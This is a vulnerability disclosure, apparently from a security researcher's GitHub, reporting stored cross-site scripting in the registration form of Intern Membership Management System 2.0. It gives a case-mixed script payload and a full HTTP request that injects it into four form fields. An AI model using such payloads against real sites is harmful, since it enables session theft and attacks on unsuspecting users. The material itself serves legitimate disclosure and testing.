# Intern_Membership_Management_System-Stored_Cross_site_Scripting
+ **Exploit Title:** Intern_Membership_Management_System-Stored_Cross_site_Scripting
+ **Date:** 2023-23-12
+ **Exploit Author:** Hamdi Sevben
+ **Vendor Homepage:** https://code-projects.org/intern-membership-management-system-in-php-with-source-code/
+ **Software Link:** https://download-media.code-projects.org/2020/01/INTERN_MEMBERSHIP_MANAGEMENT_SYSTEM_IN_PHP_WITH_SOURCE_CODE.zip
+ **Version:** 2.0
+ **Tested on:** Windows 10 Pro + PHP 8.1.5, Apache 2.4.53
+ **CVE:** CVE-

## References: 

## Description:
Intern Membership Management System 2.0 allows Stored Cross-site Scripting via parameters 'userName', 'firstName', 'lastName', and 'userEmail' in "/intern/user_registration/".
Intern Membership Management System is vulnerable to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.
An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. 
This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Proof of Concept:
+ Go to the user registration page: "http://localhost/intern/user_registration/"
+ Use this payload: `"><ScRiPt>confirm(document.domain)</ScRiPt>h0la`
+ Fill 'userName','firstName', 'lastName', '' and 'userEmail' parameters on the form and click 'Register' button.
+ The Stored XSS will be triggered.
+ Alerts will pop-up permanently.
+ Example request for 'userName', 'firstName', 'lastName', and 'userEmail' parameters:
```
POST /intern/user_registration/index.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 373
Origin: http://localhost
Connection: close
Referer: http://localhost/intern/user_registration/index.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

userName=%22%3E%3CScRiPt%3Econfirm%28document.domain%29%3C%2FScRiPt%3Eh0la&firstName=%22%3E%3CScRiPt%3Econfirm%28document.domain%29%3C%2FScRiPt%3Eh0la&lastName=%22%3E%3CScRiPt%3Econfirm%28document.domain%29%3C%2FScRiPt%3Eh0la&password=&confirm_password=&userEmail=%22%3E%3CScRiPt%3Econfirm%28document.domain%29%3C%2FScRiPt%3Eh0la&gender=Male&terms=on&register-user=Register
```

+ Example payload: `"><ScRiPt>confirm(document.domain)</ScRiPt>h0la`
![2](https://github.com/h4md153v63n/CVEs/assets/5091265/8c711e71-94df-48eb-98af-9b16fbbecd31)
![2_xss](https://github.com/h4md153v63n/CVEs/assets/5091265/1a45f2d0-4bfa-4a20-9b7e-59f8d6aba24d)
![2_xss-2](https://github.com/h4md153v63n/CVEs/assets/5091265/337eeddd-d66f-4dd9-8887-923637a2b680)
